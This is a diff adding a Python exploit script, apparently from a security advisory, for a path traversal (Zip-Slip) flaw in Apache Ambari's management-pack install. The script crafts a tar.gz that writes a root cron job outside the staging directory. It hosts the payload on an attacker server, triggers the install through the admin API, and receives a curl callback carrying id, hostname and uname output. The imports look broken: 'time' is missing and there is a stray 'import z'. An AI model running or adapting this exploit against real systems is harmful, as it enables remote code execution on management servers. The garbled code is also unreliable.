@@ -1,0 +1,181 @@
+#!/usr/bin/env python
+#
+#
+# Apache Ambari 3.0.0 (MpackManager) Path Traversal Arbitrary File Write
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://ambari.apache.org
+# Affected version: 3.0.0
+#
+# Summary: The Apache Ambari project is aimed at making Hadoop management
+# simpler by developing software for provisioning, managing, and monitoring
+# Apache Hadoop clusters. Ambari provides an intuitive, easy-to-use Hadoop
+# management web UI backed by its RESTful APIs.
+#
+# Desc: Apache Ambari is vulnerable to path traversal (Zip-Slip) in its
+# management-pack extraction: a POST /api/v1/mpacks install downloads an
+# attacker-supplied tar.gz and MpackManager.extractTar writes each entry
+# using its name verbatim (new File(untarDirectory, entry.getName())) with
+# no ../canonical-path check. A crafted entry such as ../../../../../../etc/cron.d/ambari_pwn
+# is written outside the staging directory on the ambari-server host as
+# the ambari-server user resulting in arbitrary file write and remote code
+# execution on the management server (the archive URL is also fetched via
+# new URL(mpackUri).openStream(), a secondary SSRF primitive). The operation
+# requires the top-level AMBARI_ADMINISTRATOR role, so this is an application-admin
+# to OS-level-RCE escalation that a well-formed mpack cannot achieve.
+#
+# =========================================================================
+# MpackManager.extractTar - mpack/MpackManager.java:250-283:
+# ----------------------------------------------------------
+# private void extractTar(Path tarPath, File untarDirectory) throws IOException {
+#     TarArchiveInputStream tarFile = new TarArchiveInputStream(
+#         new GzipCompressorInputStream(new BufferedInputStream(new FileInputStream(new File(String.valueOf(tarPath))))));
+#     TarArchiveEntry entry;
+#     while ((entry = tarFile.getNextTarEntry()) != null) {
+#         File outputFile = new File(untarDirectory, entry.getName());
+#         if (entry.isDirectory()) {
+#             outputFile.mkdirs();
+#         } else {
+#             outputFile.getParentFile().mkdirs();
+#             final OutputStream outputFileStream = new FileOutputStream(outputFile);
+#             IOUtils.copy(tarFile, outputFileStream);
+#         }
+#     }
+# }
+# =========================================================================
+#
+# Tested on: GNU/Linux x86_64 (7.0.12)
+#            JDK 17
+#            PostgreSQL 10.23
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6038
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6038
+#
+#
+# 13.09.2026
+#
+
+
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer#
+import urllib.request#                                            #
+import threading#                                                #
+import argparse#        .            ,                          #
+import tarfile#                    .:/                         #
+import base64#          .      ,,///;,   ,;/                  #
+import json#              .   o:::::::;;///                  #
+import sys#                  >::::::::;;\\\                 #
+import os#                     ''\\\\\'" ';\               #
+import io#                        ';\                     #
+import z#                                                #
+
+"""
+Usage:
+  python3 ambari.py --attacker-ip 192.168.1.8 --ambari http://192.168.1.129:8888 \
+                    --user admin --password admin [--port 8000] [--timeout 100]
+"""
+
+RAND = os.urandom(3).hex()
+ESCAPE_NAME = "ZSL_ESCAPE_%s.txt" % RAND
+MARKER = ("ZIPSLIP-OK zsl %s ts=%d\n" % (RAND, time.time())).encode()
+
+def build_mpack(attacker):
+    mpack_json = json.dumps({
+        "name": "zsl", "version": "1.0.0", "definition": "evil.tar.gz",
+        "prerequisites": {"min-ambari-version": "3.0.0"},
+    }).encode()
+
+    cron = ("* * * * * root curl -s -X POST --data \"$(id; hostname; uname -a)\" "
+            "http://%s/cb >/dev/null 2>&1\n" % attacker).encode()
+
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as t:
+        def add(name, data, mode=0o644):
+            ti = tarfile.TarInfo(name); ti.size = len(data); ti.mode = mode; ti.mtime = int(time.time())
+            t.addfile(ti, io.BytesIO(data))
+        def adddir(name):
+            ti = tarfile.TarInfo(name); ti.type = tarfile.DIRTYPE; ti.mode = 0o755; t.addfile(ti)
+        adddir("evil"); add("evil/mpack.json", b'{"name":"zsl","version":"1.0.0"}')
+        add("../%s" % ESCAPE_NAME, MARKER)
+        add("../../../../../../../../etc/cron.d/zsl_poc", cron)
+    return mpack_json, buf.getvalue()
+
+class Sink(BaseHTTPRequestHandler):
+    mpack_json = b""; tar_gz = b""; got = threading.Event(); cb_body = b""
+    def log_message(self, fmt, *a):
+        sys.stderr.write("    [httpd] %s - %s\n" % (self.client_address[0], fmt % a))
+    def _send(self, code, body=b"", ctype="application/octet-stream"):
+        self.send_response(code); self.send_header("Content-Type", ctype)
+        self.send_header("Content-Length", str(len(body))); self.end_headers()
+        if body: self.wfile.write(body)
+    def do_GET(self):
+        if self.path.startswith("/mpack.json"): self._send(200, Sink.mpack_json, "application/json")
+        elif self.path.startswith("/evil.tar.gz"): self._send(200, Sink.tar_gz, "application/gzip")
+        elif self.path.startswith("/cb"): Sink.cb_body = b"(GET callback)"; Sink.got.set(); self._send(200, b"ok")
+        else: self._send(404, b"nf")
+    def do_POST(self):
+        if self.path.startswith("/cb"):
+            n = int(self.headers.get("Content-Length", 0) or 0)
+            Sink.cb_body = self.rfile.read(n) if n else b"(empty)"
+            Sink.got.set(); self._send(200, b"ok")
+        else: self._send(404, b"nf")
+
+def http_req(url, user, pw, method="GET", data=None):
+    req = urllib.request.Request(url, data=data, method=method)
+    req.add_header("Authorization", "Basic " + base64.b64encode(("%s:%s" % (user, pw)).encode()).decode())
+    req.add_header("X-Requested-By", "ambari")
+    if data is not None: req.add_header("Content-Type", "application/json")
+    try:
+        r = urllib.request.urlopen(req, timeout=30)
+        return r.status, r.read().decode("utf-8", "replace")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode("utf-8", "replace")
+    except Exception as e:
+        return None, str(e)
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--attacker-ip", required=True, help="this host's IP as seen by the Ambari server")
+    ap.add_argument("--port", type=int, default=8000)
+    ap.add_argument("--ambari", required=True, help="e.g. http://192.168.1.129:8888")
+    ap.add_argument("--user", default="admin"); ap.add_argument("--password", default="admin")
+    ap.add_argument("--timeout", type=int, default=100, help="seconds to await the cron callback")
+    a = ap.parse_args()
+    attacker = "%s:%d" % (a.attacker_ip, a.port)
+
+    Sink.mpack_json, Sink.tar_gz = build_mpack(attacker)
+    httpd = ThreadingHTTPServer(("0.0.0.0", a.port), Sink)
+    threading.Thread(target=httpd.serve_forever, daemon=True).start()
+    print("[*] Serving mpack + /cb sink on 0.0.0.0:%d" % a.port)
+    print("[*] POST %s/api/v1/mpacks  (admin=%s)" % (a.ambari, a.user))
+    code, body = http_req(a.ambari + "/api/v1/mpacks", a.user, a.password, "POST",
+                          json.dumps({"MpackInfo": {"mpack_uri": "http://%s/mpack.json" % attacker}}).encode())
+    print("    -> HTTP %s  %s" % (code, (body or "").replace("\n", " ")[:120]))
+    print("       (500 'Request failed' is expected: the move step fails after extraction. Write already happened.)")
+
+    time.sleep(2)
+    print("[*] Verify arbitrary write (escape): GET %s/resources/%s" % (a.ambari, ESCAPE_NAME))
+    c2, b2 = http_req(a.ambari + "/resources/" + ESCAPE_NAME, a.user, a.password)
+    if c2 == 200 and b2.startswith("ZIPSLIP-OK"):
+        print("    -> HTTP 200  %r   <== Zip-Slip confirmed." % b2.strip())
+    else:
+        print("    -> HTTP %s  %r   (Escape marker not served. Check paths.)" % (c2, (b2 or "")[:80]))
+
+    print("[*] Awaiting cron RCE callback on /cb (up to %ds)..." % a.timeout)
+    if Sink.got.wait(a.timeout):
+        print("\n=== RCE CALLBACK RECEIVED (command executed on the Ambari host) ===")
+        print(Sink.cb_body.decode("utf-8", "replace").strip())
+        print("==================================================================")
+    else:
+        print("     No callback within %ds" % a.timeout)
+
+    httpd.shutdown()
+    print("[*] Done.")
+
+if __name__ == "__main__":
+    main()
